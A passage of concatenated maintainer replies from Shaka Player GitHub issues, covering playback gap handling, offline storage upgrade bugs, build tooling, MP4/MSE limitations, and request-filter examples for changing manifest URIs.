me was that while I was paying attention to the beta instance, the copy of Shaka running in Chrome stable eventually decided to jump the gap after all...\n```js\nIgnoring large gap at 224.939685 playhead.js:527\nIgnoring large gap at 227.225531 playhead.js:527\n// ... time passes ...\nIgnoring large gap at 227.343401 playhead.js:527\nJumping forward 0.3898969999999906 seconds because of gap starting at 224.828583 and ending at 228.985999 playhead.js:536\n```\nWe will continue to look into this.  Can we count on this asset remaining up in the short term while we investigate?  If this ends up as a Chrome bug, can we keep this asset available long-term to help validate the fix and watch for regressions?. Thanks for letting us know!  Any details you can share with the rest of the community, in case anyone else has a similar issue?. Cherry-picked to v2.3.1.. Cherry-picked for v2.2.10.. Here are some numbers on command-line length taken from my workstation.  These depend on the state of the project today, the length of the path to my working directory, and other factors.  But these should provide a sense of scale.\n| step | command length |\n| ----- | ----- |\n| Generating Closure dependencies | 162 |\n| Running Closure Compiler linter | 17776 |\n| Running eslint | 17760 |\n| Running htmlhint | 347 |\n| Checking the tests for type errors | 17842 |\n| Checking the usability of generated externs |  9615 +  2097 |\n| Compiling the library (debug) | 10369 + 9624 |\n| Compiling the demo app (debug) | 3114 |\n| Compiling the receiver app (debug) | 2767 |\n| Compiling the library (release) | 10455 + 9618 |\n| Compiling the demo app (release) | 3096 |\n| Compiling the receiver app (release) | 2749 |\nWindows has an 8kB limit on command line length.  It's not clear to me why we would have only recently started tripping over this limit, or if there are any exceptions.  All of these commands are invoked from python using subprocess.Popen with an argument array.. The problem seems to come from the addition of eslint, specifically.  It's the long list of files, combined with the use of node_modules/.bin/eslint.cmd on Windows.  The cmd script passes through the arguments, which breaks the command-line limit.  python's subprocess.Popen is not what triggers the error.. Related to work on issue #1157. Cherry-picked to v2.3.1.. This should be reproducible using the Axinom multi-DRM asset, but a platform that supports offline DRM content is required.. Fix cherry-picked for v2.3.2. Confirmed.  Reproduced on the first try for me in Chrome with the latest code.. We are working on a fix.  As a work-around, you can clear your IndexedDB storage in the Chrome debugger.. This affects all app upgrades to v2.3 where there was any offline content stored by an earlier version.  All v2.3.x releases are affected.. We are going to implement the quickest fix we can for this issue: a new error code to detect upgrade issues and a new method to delete the existing database.  This will allow applications to recover from this issue, albeit at the expense of any content already stored by end-users.  The changes will appear in our next release, v2.3.2.. To track the long-term fix, in which we will support reading data from older versions, subscribe to #1248.. We are unable to add new content because of a problem in the schema of the upgraded tables.  During our investigations, we found that the mis-upgraded tables were only part of the problem.  Larger tables could not be upgraded at all, leaving the v2.2 content completely inaccessible if it is over a certain size.. Fixes cherry-picked for v2.3.2. This should be working now in the nightly build:  https://nightly-dot-shaka-player-demo.appspot.com/demo/\nCan someone please confirm?. @TheModMaker, can you please take a look?. Cherry-picked for v2.3.3.  The correctness of the fix was still being debated while I was preparing v2.3.2.  Sorry for any inconvenience caused by delaying this fix for one more release.. Referring to the analysis above in https://github.com/google/shaka-player/issues/1232#issuecomment-362349850, if the segment times are in the future, it sounds like it's not drift, but rather a clock sync or encoder clock issue.  Is the clock on your encoder correct?  Do you have clock sync set up on the content?. I don't know, but it could be a bug in the Elemental encoder.  Have you talked to Elemental support?. As far as we can tell (analysis above), the segment times are in the future.  Since we are already planning a general approach to ignore availabilityStartTime (#999), I don't think there's anything more specific we can do for you right now.  I expect your problem will be solved once #999 is implemented.  In the mean time, you are always welcome to customize Shaka Player sources however you need to for your deployment.\nSorry we couldn't do more for you directly.  If you subscribe to #999, you will be notified when we close the issue.. We currently take a strict view of this and require the presentation timeline (derived from AST) to be correct.  In future, we may be more flexible, to better tolerate drift in live streams.  See #999 for details.. New doc cherry-picked for v2.3.4.. Sounds reasonable.  Thanks!. Cherry-picked for v2.3.2.  Just barely missed the cut-off for v2.3.1.. It looks like jsdoc doesn't like your trailing comma in the doc string.  I'll file a bug to make jsdoc more flexible, as trailing commas are recommended in other contexts.. Yes ./build/docs.py will build the documentation.  It is a little silly and counterintuitive that all.py doesn't include docs.py, but we reasoned that someone who wants to rebuild the code all the time during development won't want to rebuild the docs all the time.  I'm honestly unsure what the best change would be to improve that.. Okay, everything looks good!  Thanks!. Cherry-picked for v2.3.2.  Just barely missed the cut-off for v2.3.1.  Thanks again for the contribution!. Yes, the fix for #1232 has been cherry-picked for v2.3.3. The correctness of the fix was still being debated while I was preparing v2.3.2. Sorry for any inconvenience caused by delaying this fix for one more release.. I'm going to go ahead and close as a duplicate.  Thanks!. shaka.player.DashVideoSource.event:SeekRangeChanged is from our v1 API, which we no longer support.  The document in which you found that is very old, and should be disregarded.  The rest of your sample code appears to be from our v2 API, which is current.  The docs for our latest release are here: https://shaka-player-demo.appspot.com/docs/api/index.html\nUI controls are not part of Shaka Player at this time.  We provide the library and an API on which you can build your application and your controls UI if you wish.  You can also use the browser's built-in video controls if you wish.  In your sample HTML above, you have the control attribute on the <video> tag, which enables the browser's built-in controls.  The browser's built-in controls do not generally work well for live streaming.\nThe method you want in the v2 API is player.seekRange().  There is no corresponding event because the range changes as playback progresses, so you can simply poll seekRange() when you are playing live content.  You can use player.isLive() to determine if something is live content.\nCustom video controls can be overlayed over the <video> element using CSS, and you can put whatever you like there.  Be sure to remove the controls attribute from the <video> element to disable the browser's built-in controls.  For a fully-worked example of video controls, you can refer to the ones in our demo app:\n  - https://github.com/google/shaka-player/blob/v2.3.x/demo/common/controls.js\n  - https://github.com/google/shaka-player/blob/v2.3.x/demo/common/controls.css\n  - https://github.com/google/shaka-player/blob/v2.3.x/demo/index.html\n  - https://github.com/google/shaka-player/blob/v2.3.x/demo/demo.css\nWe hope to be able to provide a reusable video controls component in the future, but for now, we hope these examples will be helpful.. Does this answer your question?. Unfortunately, there is no trivial way to do this in Shaka Player, or in any MediaSource-based player.\nThe browser provides the MediaSource API, and Shaka Player feeds media segments to that.  The browser itself is responsible for demuxing, decoding, and displaying the media, so we can't control the capabilities of that part of the system.\nIf the presentation is set up with both audio and video, browsers will not generally play through a section that contains only video or only audio.  So if the video ends earlier, we cannot continue in an audio-only mode until the audio runs out.\nThere are two obvious ways to work around this limitation:\n 1. Change your media so that everything aligns (for example, pad the video at the end with black frames)\n 2. Fabricate H.264-encoded black frames in JavaScript, wrap them in an MP4 container, and inject fake content on-the-fly\nOption 2 is far too complex, in my opinion, and is outside of our goals for the project.  But if you wanted to pursue it yourself, the source is all there and under a fairly liberal Apache license.\nDoes this answer your question?. @dean-river, if you want to remove source buffers to support this scenario, you are very welcome to make whatever changes you like in Shaka Player.  It's open-source, after all!  I don't have any better suggestions, though.  This is not something we are going to do in official releases of Shaka Player.\nAs for multi-period content, we have supported that in all releases since v2.0.0.\nHave we answered your questions?  Is there anything else we can do for you?. Error 6001 is REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE.  So it would appear that this isn't supported.\nCan you please try our support page in Xwalk and paste the results here on github for us?  https://shaka-player-demo.appspot.com/support.html\nThat will help us understand what it does and doesn't support.. It looks like xwalk and WebView support all the same containers and codecs.  Xwalk reports support for Widevine, but not persistent licenses:\njs\n    \"com.widevine.alpha\": {\n      \"persistentState\": false\n    }\nWebView reports no support for Widevine at all:\njs\n    \"com.widevine.alpha\": null. If the browser environment (xwalk in this case) reports no support for persistent licenses, there's nothing we can do from JavaScript to change that.\nI noticed that WebView is based on Chrome 63 (which is current), but your version of xwalk is based on Chrome 53, which is 10 releases out of date (a little more than one year).  I expect you would see different results with an updated xwalk based on a current release of Chrome.  Persistent license support only came to Chrome Android a few months ago (if I recall correctly).\nActually, I just found this announcement from the crosswalk project, in which they state the project has shut down and is no longer maintained: https://crosswalk-project.org/blog/crosswalk-final-release.html\nYour best bet is probably to move to another hybrid app framework that is still being maintained.  I have heard good things about Electron (https://electronjs.org/), though I have never used it myself.. I'm not sure what the issue might be.  The browser reports that it supports Widevine with persistent licenses, so that shouldn't be an issue.\n * What exactly are you doing in the application to trigger error 6001?\n * Are you using the demo app?\n * What version of Shaka Player are you using?. Closing due to inactivity.  Let us know if you need further assistance.. You may be interested in https://github.com/google/shaka-player/issues/816, in which will we support playback of single files.  However, you should note that this would not use MSE.\nIf I'm not mistaken, MediaSource can be used to play fragmented MP4s, but not MP4 files generally.  Fragmented MP4 files are structured differently and can be fetched in independent pieces.  This is what DASH and HLS use when they refer to MP4 files.  General MP4 files will have to be played directly with HTML5 video, which you can already do today without Shaka Player.\nAs for stats, you may be interested in player.getStats(), which returns a bundle of stats for display, for aggregate QoE logging, etc.  Some of those stats are only collectable, though, when we stream through MSE.  Using src=, the browser becomes responsible for networking and buffering, and there is no adaptation, so most of our stats and configuration becomes meaningless in that mode.  When we do offer src= playback, it will be a convenience feature only, so developers don't have to switch between Shaka Player and plain HTML5 video for different sources.\nDoes this answer your question?. If you use video.src= to play an MP4 without MediaSource, you give up control over networking and buffering.  The browser will do those things, instead.\nI am not certain, but I am under the impression that not all MP4 files are playable with MSE.  I could be wrong.  In any case, our plans for playing back single files do not include MSE.. Well, plain MP4 with MSE is not in our current plans, but if it's something you want to contribute, I'm not opposed to it.  We just don't have time to work on it ourselves.\nIf you decide to pursue it, your best starting point would be some experiments using MSE directly, to figure out what will and won't be accepted by most browsers.  We would be happy to advise you further after that, if it's helpful.. I just had a discussion about this with another teammate, and we think the issue with general MP4s in MediaSource is the hierarchical nature of MP4 boxes.  In fragmented MP4, segments can be parsed independently, but that is not the case in general MP4s.  So you may need to be careful about your content, and transmux it into fragmented MP4 if it's not in that format already.\nAll of this is speculation, and we haven't spent any effort to verify what browsers do or don't support when it comes to non-fragmented MP4 + MSE.. Makes sense to me.  Thanks for looking into this!\nSince general MP4s do not work through MSE, I'm going to go ahead and close this issue as \"infeasible\".\nPlease let us know if there's anything else we can do!. @sandersaares, that all looks fine to me.  Realistically, we are not going to implement a leap-second-aware clock, though.  The whole thing is predicated on the use of availabilityStartTime to compute the perfect presentation timeline.  But we already can't count on availabilityStartTime because of encoder drift.  See #999.  Ultimately, we will ignore availabilityStartTime for all but SegmentTemplate+duration manifests.. We use Date.parse to parse XML date strings.  I don't know if it is leap-second aware or not.  We convert date strings into seconds since 1970.  See shaka.util.XmlUtils.parseDate.\nIn your example, we compare the results of Date.parse with the results of Date.now to understand how long the stream has been running and compute the ideal presentation time of the live edge.  Clock sync, if used, will offset Date.now by some amount first.. See comments in https://github.com/google/shaka-player/issues/1244#issuecomment-359900982 and above.  I was wrong, and we will not do this after all.  Sorry for the confusion.. I had suggested we use Blobs everywhere, since XHR, Fetch, and IndexedDB all support blobs.  But if MediaSource doesn't support them, and we will need to read network responses in some places anyway, we should probably only use Blobs in IndexedDB after all.. Sorry for the confusion.  I should have researched a little more before suggesting this.. @DenisDashkevich, please provide a manifest URI.  A copy of the manifest text is not enough to reproduce most issues, including this one.. Please fill out our issue template so we have the information we need to reproduce and resolve your issue.  The issue template is the text you deleted when you filled out the form.  Here's another copy, for your convenience:\nHave you read the FAQ and checked for duplicate issues:\nWhat version of Shaka Player are you using:\nCan you reproduce the issue with our latest release version:\nCan you reproduce the issue with the latest code from master:\nAre you using the demo app or your own custom app:\nIf custom app, can you reproduce the issue using our demo app:\nWhat browser and OS are you using:\nWhat are the manifest and license server URIs:\n(you can send the URIs to shaka-player-issues@google.com instead, but please use GitHub and the template for the rest)\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?\n. If the Blob refers to something on your local computer, the Chromecast won't have access to it.  When you cast in Shaka, you are simply transferring the playback URI to the other device.  So it must be a URI that is accessible to the Chromecast.\nDoes this answer your question?. Fixes to date cherry-picked for v2.3.2. I used the phrase \"when we resolve\" in a commit, and referred to this bug, which means I accidentally closed it.  Whoops!. Backward compatibility for v2.2.x's offline storage system has finally been restored in the master branch.  I will be cherry-picking all of this work to v2.3.x for release in v2.3.8 soon.. All fixes will appear in v2.3.8 and v2.4.0 this week.. @odedhutzler, this issue was about backward compatibility for upgrades.  Please file feature requests for those new features.  Thanks!. We recommend against saving content in the service worker because it causes issues with adaptation and bandwidth estimation.  The offline API will save a subset of the tracks (your choice, through the trackSelectionCallback), which is more appropriate for offline playback, where adaptation is not necessary.. > We intend saving one track subset per an entry (one audio, one video and one text track) - will it still cause issues with the bandwidth and adaption estimations?\nIf you cache the entire manifest, then yes, it would.  The offline storage API saves the metadata for the stored tracks and reconstructs a manifest that only contains the stored tracks.  Because we don't cache the entire manifest, the Player will never try to adapt to a track that isn't stored.\n\nAlso, we would like more control on the download process, and the downloaded data (pausing, resuming, managing a queue of downloads etc). In the future we want to use the background fetch API (in the service worker) which will allow us to download content while the browser is closed.\n\nYes, background fetch should work.  We haven't tried it ourselves yet, but we plan to: #879. I don't understand your question about reconstructing the manifest.\nIn Shaka Player, manifest parser plugins are responsible for fetching manifests and parsing them into an internal format (shakaExtern.Manifest).  The parser consumes the actual manifest text from the network, while internal components like StreamingEngine only deal with the shakaExtern.Manifest representation.\nWhen we store content offline, we store the media for the app-selected tracks, and we store the metadata necessary to play that media back (container and codecs, resolution, etc).  When I say we \"reconstruct\" the manifest, I don't mean that we recreate the MPD or M3U8 files.  What we do is construct a shakaExtern.Manifest object that contains the metadata from the offline database.  Then StreamingEngine can play that content back, even though it is coming from the database instead of the network.\nDoes that makes sense?\nThe offline license API is EME, which is provided by the browser.  So it's already \"exposed\", in a sense.\nWe do not plan to expose this API through Shaka Player, though, since it is a core goal to make playback and storage easy.  We take care of EME for you, and we have put a lot of effort into making things work as smoothly and robustly as possible across browsers.\nSince Shaka Player is open source, you can always make whatever changes you like, including exposing more of the internals, like DrmEngine, which handles the EME API.\nDoes this answer your questions?. No problem.  I'm glad we could help.. The broken links at cdnjs seems to be a cdnjs bug.  They pull our stuff automatically from npm.\nDoing anything with cdnjs yourself is challening, though, because they keep all libraries & versions in git, in one repo.  Their git repo is so massive it typically fails to check out.  They use a bot to pull new releases from npm and update the repo.\n@boredom2, I recommend you file a bug against cdnjs about the broken links.  In the mean time, there are other options, such as jsDelivr and Google's Hosted Libraries.\nI will keep this open to investigate why the version number in our official v2.3.1 release claims to be dirty (local modifications), and what local mods there were, if any, that affected the build.. The build in NPM is fine, and has version string \"v2.3.1\", as it should.  The build on Google's Hosted Libraries seems to be the only one that says \"v2.3.1-dirty\".  Still tracking down what the dirt is.. The last several releases are fine: v2.2.9, v2.2.10, v2.3.0.  The only difference between the npm build of v2.3.1 and the Hosted Libraries build of v2.3.1 is the version string, in which the latter holds the \"-dirty\" suffix.\nThe \"-dirty\" suffix can happen if there are any local mods anywhere in the tree, including in the docs or the build scripts.  I am still tracking down what part of the release process caused this suffix, but the builds are all correct and safe to use.. The \"-dirty\" suffix is caused by b3b7860f8cd2d57e4649fcffea7c016a4bd81501, in which JS files all get LF line endings.  The file third_party/jsdoc/node_modules/catharsis/node_modules/underscore-contrib/underscore.array.selectors.js has CRLF endings, and these were converted to LF in the release process for Google Hosted Libraries.  This constituted a change in the working directory, which led to the \"-dirty\" flag, even though no changes were made to the library.\nSo, to summarize all of the above, this is a cosmetic issue only, only affects the copy in Google Hosted Libraries, and the process will be fixed for the v2.3.2 release.. Once the linked draft spec can be tested in Chrome, we will add support to our demo app to show how it can be used with Shaka Player.  We do not anticipate any changes to the library itself for this.. This feature will be out in v2.4 this week.. Could you please add test coverage of the new parameter in this PR?\nAlso, I think we just merged some changes which might conflict, so you will need to rebase.\nFinally, I would appreciate it if you would also add the third parameter to the other scheme plugins: lib/net/data_uri_plugin.js, lib/offline/offline_scheme.js, and test/test/util/test_scheme.js.  These plugins won't use the parameter, but the interface should be up-to-date everywhere if possible.. I think it may be a browser bug.  I am surprised that the browser treats CORS differently in a service worker.  My best suggestion is to file a bug on http://crbug.com/ and link to it here so we can follow along.. @krvangala, were you able to make any progress with these suggestions?  Is there anything else we can do for you?. Okay.  I'll go ahead and close the issue for now.  If you need more help, just let us know, and we can reopen the issue.  Thanks!. Fix cherry-picked for v2.3.2. The latest jsdoc can parse ES6, but we would lose some of our customizations.  I will investigate what it would take to unfork jsdoc.  If we can, we will use jsdoc from npm instead of keeping a forked copy in the repo.. I can't find an easy way to deal with the lack of error code when the existing jsdoc fails.  Executing latest jsdoc from npm, we do get a non-zero error code when it fails.. Good news: new jsdoc is WAY faster.  On my workstation, building the docs went from about 35s with the old tools to about 5s with the new tools.  7x faster.. Some of the code which triggers this has been cherry-picked to v2.3.x and must be patched up in that branch.  Otherwise, this issue will block v2.3.x releases.. All fixes for this issue have now been cherry-picked to v2.3.x, to facilitate the cherry-picking of other changes (which use ES6) to v2.3.x.. It looks like the easiest answer is to stop using our own polyfill for Promises.  Switching to https://github.com/lahmatiy/es6-promise-polyfill fixes the bug.  That polyfill is also smaller than ours (1kB vs 4kB), and it allows individual applications to decide if they want to support IE11 by loading that polyfill in addition to Shaka Player.\nSo starting in v2.4.0, IE support will be contingent on loading this additional polyfill, which our demo app and tests will do.. This change will be out in v2.4 this week.  Apps using v2.4+ will need to polyfill Promise support in IE at the application level.  We recommend this polyfill: https://github.com/lahmatiy/es6-promise-polyfill. @dingconggithub, you don't need to register manifest parsers.  The HLS parser is already registered by default.  I don't see anything else obviously wrong in your code.\nAre you loading your code from a file:/// URI?  As noted in the \"welcome\" tutorial, file:/// URIs will not work.  You will need a local web server for development.\nIf it isn't working for you, please tell us what errors you are getting through onError.  Also, please tell us what manifest URI you are using.\nDoes any of that help?. Closing due to inactivity.  Let us know if you need anything else.. Thanks!  I have updated the corresponding text on the github releases page: https://github.com/google/shaka-player/releases/tag/v2.2.10  https://github.com/google/shaka-player/releases/tag/v2.3.1. Cherry-picked to v2.3.2. Fix cherry-picked to v2.3.5.. Makes sense to me.  Thanks!  Just running it through the build bot before we merge it.. Thanks for your contribution!. Cherry-picked to v2.3.2. VTT in MP4 should have a codecs attribute of 'wvtt', right?  @kqyang, I believe that should be added if it's missing.. It is tricky to take a list of codecs and figure out which goes to which stream.  It is one of the ways in which HLS can be more challenging than DASH.  We have a whitelist of audio & video codecs in the HLS parser to help with that.  We may need to expand it to text.. Wait, actually, we already have that.  Something strange is going on.. Fixed, and cherry-picked to v2.3.3.. Cherry-picked for v2.3.3.. Thanks!. Cherry-picked for v2.3.3.. Wow, thanks for all your work on this!  Do you think it's ready for a review, or should we wait a bit longer?. No worries!  We are happy to have the contribution, and we are in no rush.. @niklaskorz, sorry I missed your most recent message.\nRight now, the events we dispatch are only described at the jsdoc level, not in any actual Closure types.  For example:\njs\n/**\n * @event shaka.Player.ErrorEvent\n * @description Fired when a playback error occurs.\n * @property {string} type\n *   'error'\n * @property {!shaka.util.Error} detail\n *   An object which contains details on the error.  The error's 'category' and\n *   'code' properties will identify the specific error that occurred.  In an\n *   uncompiled build, you can also use the 'message' and 'stack' properties\n *   to debug.\n * @exportDoc\n */\nIt would be ideal to make these part of the externs, though.  Some changes would be necessary in player.js to make this happen, and I'm not 100% sure what they would be.  That's something we can work on, though.  I've filed an issue for that here: https://github.com/google/shaka-player/issues/1564\nOnce the event types are proper types to the compiler, the extern/def generators should be able to pick them up without any special support.. Cherry-picked for v2.3.3.. I believe MP4Client is not browser-based.\n\nIf you play the audio, at 04:05:32 the duration inside the player UI suddenly changes from 04:06:21 to 04:05:45. Once the player reaches 04:05:45 it just stops.\n\nWhen all segments have been buffered, MediaSource truncates the duration of the media element to match the end of the buffered data.  So 04:05:32 is likely when the last segment was appended to the buffer.  If the duration is 04:05:45, then stopping at that point is correct and expected.\nIf the original input file is 04:06:21, and the output segments end at 04:05:45, then it would seem to be a bug in MP4Box that loses the end of your content.  Since a different segment size changes the results, I think this is more evidence pointing toward MP4Box.\nLooking at the content itself, I see that the original input file is indeed 04:06:21, which is 14781 seconds.  14781 / 4 should yield 3696 segments (rounding up), but your manifest has 3706 segments.  Looking at the segments in more detail, segment 1 has an actual length of 3.98933 seconds.  The accumulated errors across 3706 segments account for the missing time.\nIn the end, the issue is that your manifest says you have 4s segments, but you don't.  It's okay for the segment sizes to vary a little, but the errors should be corrected over time, rather than accumulating.  For example, if you had 2x 3.98933 second segments, then the next segment was 4.010663 seconds (an extra 1024 samples at 48kHz), this would balance out over time and the manifest would be accurate enough.  But instead, the errors accumulate over time and the manifest is very wrong by the end.\nI highly recommend you file a bug on GPAC about this, and reference this conversation if it helps.  The total accumulated error in a DASH stream should not exceed one half segment length (or 2s in your case).  Clients may not be able to tolerate anything less accurate than this.. Closing due to inactivity.  Let us know if you need any more help.. Cherry-picked for v2.3.8.. This makes it impossible to wipe the database when it is corrupt or unusable.  This change will be reverted.. To properly remove content, call storage.remove() on each of the stored contents.  Only use deleteAll() for a complete erasure of the database with no business logic.  The docs will be updated accordingly.. If you want to modify <BaseURL> specifically, you only need a request filter to change the URIs of segment requests.  No need to modify the manifest at all.\nDoes this help?. Here's an example:\n```js\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n  if (type != shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    return;  // ignore non-manifest requests\n  }\n// Look for one URI and change it to something else.\n  if (request.uris[0] == 'foo') {\n    request.uris[0] = 'bar';\n  }\n});\n```\nIf you want more detail, I recommend reading the tutorial on license server authentication: https://shaka-player-demo.appspot.com/docs/api/tutorial-license-server-auth.html\nIt goes into detail about various things you may want to do in changing requests.  Although it is focused on authentication and LICENSE requests, the concepts can be applied universally.  It also discusses asynchronous filters, which would allow you to asynchronously compute changes if needed.\nDoes this help?. Correct.  You are essentially changing the URI of the request before we make it.\nThe DASH parser is creating the request structure based on the original URI of the manifest (given to player.load()), plus any redirects at the HTTP level (HTTP 302) or DASH level (Location element).  Your filter gets to inspect and/or edit any part of that before it goes out on the actual network.. You don't manually force it to execute at all.  It will be executed on every single network request that occurs after you register it.  The registration persists, even when you make subsequent load() calls.  To remove a filter, you would use unregisterRequestFilter() or clearAllRequestFilters().\nIf you want to change the URIs of manifest requests (requests to get the initial manifest or to update it in the case of live streams), you can look for type == RequestType.MANIFEST.  If you want to change the URIs of segments, you can look for type == RequestType.SEGMENT.\nI think I might have gotten confused looking at the history this morning, so I showed you an example of changing manifest URIs instead of segment URIs.  Looking at the history again, I think you segment URIs might be what you really want to modify.  Is that correct?. If you want to change the manifest URI every 10 seconds, here are your options as I see them:\n\nCall load(newManifestUri), which will treat the new URI like a completely different, unrelated piece of content.  This is probably not what you want.\nPut a <Location> element in the manifest which contains the URI to use for the next manifest update, and a minimumUpdatePeriod attribute of \"PT10S\" (10 seconds in XML duration format).  Every 10 seconds, Shaka will update the manifest from the location in the most recent manifest's <Location> element.  This requires cooperation server-side and control of the manifest contents, and only works for DASH.\nUse a request filter to modify the manifest URI before the request is made.  This will work without complete manifest control and will also work for HLS.  In DASH, though, you still need a minimumUpdatePeriod attribute of \"PT10S\" for Shaka to update the manifest at that interval.\n\nDoes this help?. No, I'm sorry, I'm not familiar with React.\nI have a few more clarifying questions:\nWhen you have manifestUri1, and later you want to load manifestUri2, how are these pieces of content related?  Is one an extension of the other (more segments listed)?\nI would expect that for live streaming, the updated version would be an extension of the previous one, but it is an important distinction for me to give you the right advice.. In the case that your manifests are unrelated, you just want to call player.load() with the new manifest.  The player will unload what was already playing and load the new thing.  This is not how live streaming works, for the record.\nIf that solves your problem, you can disregard the rest of the advice here, which was based on the misapprehension that you wanted to change the manifest URI during an update of a typical live stream manifest.. Okay, then here's how this work for a live stream.\nplayer.load(manifestUri) triggers an initial manifest request.  After that, on a timer, the manifest parser will request updates to the manifest.  This is where your request filter comes in.\nEvery request gets filtered through all request filters.  Your filter can modify any request it wants before the request hits the network.  So you can change the manifest URI before each update it fetched.\nThere are two ways to do this:\n\nYour react component gets new URIs on its own schedule, however it does that.  It then caches the most recent URI.  When you filter fires, it sets request.uris[0] = mostRecentCachedUriFromReact.\nWhen your filter fires, it starts an asynchronous process to get the URI it should use for the manifest.  Your filter returns a Promise, which you later resolve after you have modified the request with a fresh URI.\n\nBecause your filter is called on all requests, you should look for MANIFEST requests specifically:\n```js\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n  if (type != shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    return;  // ignore non-manifest requests\n  }\nif (mostRecentCachedUriFromReact) {\n    request.uris[0] = mostRecentCachedUriFromReact;\n  }\n});\n```\nOr, the async version where you stop the request, calculate/fetch a manifest URI, then modify the request and continue:\n```js\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n  if (type != shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    return;  // ignore non-manifest requests\n  }\nreturn goFigureOutTheNewManifestUri.then(function(newUri) {\n    request.uris[0] = newUri;\n  });\n});\n```\nTo answer your questions from earlier:\n\nTo feed the new manifestUri to shaka-player, I would do player.load(newManifestUri), which would then execute the requestFilter where the requestType is MANIFEST, right?\n\nNo.  load() tears down everything the player was already doing (if anything), and sets up playback for a new piece of content.  The request filter is triggered for every request, period.  At least one of those will be a MANIFEST type request, assuming you register the filter before the player requests the manifest.  It suffices to register the filter before calling load().  It is also worth noting that calling load() a second time will not wipe out any existing filters.  Filters persist across multiple calls to load().\n\nBut once I change that uris[0] to the new manifest (which I currently don't know how to get scope of inside the requestFilter), it will just load a new video and not have any record of the previous piece of content, right?\n\nNo, it's the opposite.  That would be true of calling load() again, but not a request filter.  A request filter is just giving your application a chance to inspect and/or edit a request before it actually happens.  It doesn't affect anything but that manifest request.\nDoes this help?. > I was under the impression that the only times the RequestType will equal MANIFEST is when the user manually alters the manifestUri. I get that RequestType equals SEGMENT every time it's time to load a new segment, but I don't understand when Request will actually equal MANIFEST.\nThat is not true.  Live manifests have to be periodically updated, which means we will make subsequent MANIFEST requests.  For VOD, we would only request the manifest once.  In fact, there is no API for the user to manually alter the manifest URI, because this is not typically required.  We are still unclear on why you would want to do this in the first place.\n\nI had pretty much the same code as below set up with my own player, but I never saw the RequestType equal MANIFEST unless i manually did a player.load() with a new manifestUri.\n\nDid you register the filter before the first call to load()?  If you register the filter after calling load(), it would be too late to intercept the initial manifest request.\nIs the content live or VOD?  (Check player.isLive() or send us a sample URI to test.)  VOD content does not need to update the manifest.  If your content looks like VOD, but you're trying to hack it so that it \"updates\" and acts more like live, then you should stop what you are doing and build a proper live, HLS event, or DASH IPR stream instead.\n\nMy react component fetches the new manifestUri on its own, but then I somehow need to get inside of the requestFilter to set the request.uris[0] = newManifest. I can't call player.load() without tearing everything down, so I don't know how to get inside the requestFilter to set the request.\n\nHere's an example using a timer to compute a new URI.  The timer has no direct interaction with the request filter, but they both reference a common variable.  You can use a global, or attach something to window, or attach something to a namespace both pieces of code know about.  It doesn't technically matter where you store it.\n```js\n// These could easily live anywhere else that both our\n// manifest computation and request filter can access.\nlet nextManifestUri;\nlet counter = 0;\nfunction computeNextManifestUri() {\n  counter++;\n  nextManifestUri = '/foo/manifest/' + counter + '.mpd';\n}\n// Compute the first URI.\ncomputeNextManifestUri();\n// Load the content.\nplayer.load(nextManifestUri);\n// Update the manifest URI every 10 s.\nsetTimer(computeNextManifestUri, 10000);\n// Manifest requests always go to the most recently computed URI.\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n  if (type == shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    request.uris[0] = nextManifestUri;\n  }\n});\n```. > So conceptually, supposed the initial manifestUri has only 1 segment in it. When it gets to the end of the segment it will trigger the requestFilter if I'm not mistaken, but will the RequestType be MANIFEST or SEGMENT?\nNo, the manifest request has nothing to do with the number of segments in the manifest or the playback position.  It's based on a timer.  In DASH, this interval is controlled by the minimumUpdatePeriod attribute.  In HLS, it's based on the minimum of the EXT-X-TARGETDURATION tags.\nSo if your live manifest has 1 segment in it, that would be a bad time to start playback.  In DASH, playback should always be offset from the live edge by the amount of the suggestedPresentationDelay attribute.  In HLS, playback should always be offset from the live edge by 3 segments.  These features of DASH and HLS are meant to keep playback from running off the edge if there is some delay on the server side or in fetching an update.. Happy to help.  I'm going to go ahead and close the issue now.  If you need more help, just let us know and we can open it again.. The buffer starts at 1.5416 on Edge.  On Chrome and Safari, it starts at 0.  I can't account for the difference yet, but it seems to be specific to the way Edge interprets the content.  I'm going to do some more digging.. Whatever the root of the issue at the platform level, enabling gap jumping for \"large gaps\" or increasing the tolerance of \"small gaps\" works around the issue.\nHere are some examples of how to set those configurations:\n```js\n// Increase the size of the gaps that Shaka Player will automatically jump:\nplayer.configure({\n  streaming: {\n    smallGapLimit: 2.0,\n  },\n});\n// Alternately, instruct Shaka Player to jump all gaps automatically:\nplayer.configure({\n  streaming: {\n    jumpLargeGaps: true,\n  },\n});\n```. The first period's first video segment has a timestamp of 0.083 seconds according to the manifest.  The first period's first audio segment has a timestamp of 0 seconds.  The manifest contents look sane in terms of timestamps and presentationTimeOffsets.. Artificially reducing the presentationTimeOffset by as little as 1 microsecond fixes the timestamp on Edge.  I expect that the bug is caused by a rounding error in Edge's media stack that causes the first key frame to be removed, along with the rest of the GOP.  The difference in the timestamps of the first two key frames is 1.541 seconds, which accounts for the discrepancy.. I have archived this content at a URL we control so that it is sure to outlive the MS Edge bug report I'm working on.  Here's a quick repro URL:\nhttps://v2-3-2-dot-shaka-player-demo.appspot.com/demo/#asset=https://storage.googleapis.com/shaka-demo-assets/_bugs/1281/dash2.mpd;lang=en-US;play;build=uncompiled. Here's the bug I filed on Edge: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/16134130/. Working around the initial gap is not enough.  We have to work around another gap at around 60 seconds.  For that, I find that I have to reduce the start of the append window.. Workaround cherry-picked for v2.3.3.. Happy to help!. Ideally, IMA could use a second video tag so that Shaka Player could be paused and maintain state while the ad plays in a second tag which overlays the first.\nSome devices, though, can only support one video tag.  If the Chromecast can only support one video tag, you will have to tear down Shaka Player during the ad.  In this case, I suggest storing video.currentTime before IMA takes over.  Then, when IMA is done, you can call player.load(manifestUri, startTime), where startTime is the stored value of video.currentTime.  This way, Shaka Player will resume where it left off.\nDoes this help?. That's true, it will flush the buffers when IMA takes over.  There's nothing we 